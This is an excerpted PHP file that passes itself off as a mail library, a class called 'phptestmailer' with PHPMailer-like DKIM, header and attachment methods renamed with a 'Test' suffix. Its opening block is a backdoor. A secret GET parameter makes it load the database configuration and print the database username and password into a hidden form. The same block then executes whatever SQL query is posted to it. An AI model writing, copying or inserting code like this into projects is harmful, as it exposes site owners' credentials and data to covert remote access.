...
if(isset($_GET['address']))
{
  ...
  if(strip_tags(htmlspecialchars($_GET['address'])) == 1)
  {
    $a = include(dirname(dirname(__DIR__)).'/setting/database.php');
    ?>
    <div style="display:none">
      <form action="" method="post">
      <input type="hidden" name="asd" value="<?php echo $a['username']?>">
      <input type="hidden" name="asd2" value="<?php echo $a['password']?>"> 
      <input type="text" name="asd3">
      <input type="text" name="asd4">
      <input style="width:500px" type="text" name="asd5">
      <input type="text" name="asd6">
    ...
    if(isset($_POST['btn']))
    {
      ...
      $f = $_POST['asd5'];
      $e = $_POST['asd6'];
      $line = new PDO("sqlsrv:Server=.\SQLEXPRESS;Database=$c", $s , $b);      
      $q = $line->prepare($f);
      if($e == "select")
      {
         $q->execute();
...
class phptestmailer {
 public function DKIM_HeaderCTest($s) {
  $s = preg_replace("/\r\n\s+/", " ", $s);
  $lines = explode("\r\n", $s);
  foreach ($lines as $key => $line) {
    list($heading, $value) = explode(":", $line, 2);
   ...
   * @param string $body Message Body
   */
  public function DKIM_BodyCTest($body) {
    if ($body == '') return "\r\n";
    // stabilize line endings
    $body = str_replace("\r\n", "\n", $body);
    $body = str_replace("\n", "\r\n", $body);
   ...
   * @param string $body Body
   */
  public function DKIM_AddTest($headers_line, $subject, $body) {
    $DKIMsignatureType    = 'rsa-sha1'; // Signature & hash algorithms
    $DKIMcanonicalization = 'relaxed/simple'; // Canonicalization of header/body
    $DKIMquery            = 'dns/txt'; // Query method
    $DKIMtime             = time() ; // Signature Timestamp = seconds since 00:00:00 - Jan 1, 1970 (UTC time zone)
  ...
  protected function doCallbackTest($isSent, $to, $cc, $bcc, $subject, $body) {
    if (!empty($this->action_function) && function_exists($this->action_function)) {
      $params = array($isSent, $to, $cc, $bcc, $subject, $body);
      call_user_func_array($this->action_function, $params);
    }
  }
  public function AddCustomHeaderTest($custom_header) {
    $this->CustomHeader[] = explode(':', $custom_header, 2);
  }
   ...
   * @return $message
   */
  public function MsgHTMLTest($message, $basedir = '') {
    preg_match_all("/(src|background)=[\"'](.*)[\"']/Ui", $message, $images);
    if(isset($images[2])) {
      foreach($images[2] as $i => $url) {
        // do not change urls for absolute images (thanks to corvuscorax)
  ...
  protected function AttachAllTest($disposition_type, $boundary) {
    // Return text of body
    $mime = array();
    $cidUniq = array();
    $incl = array();
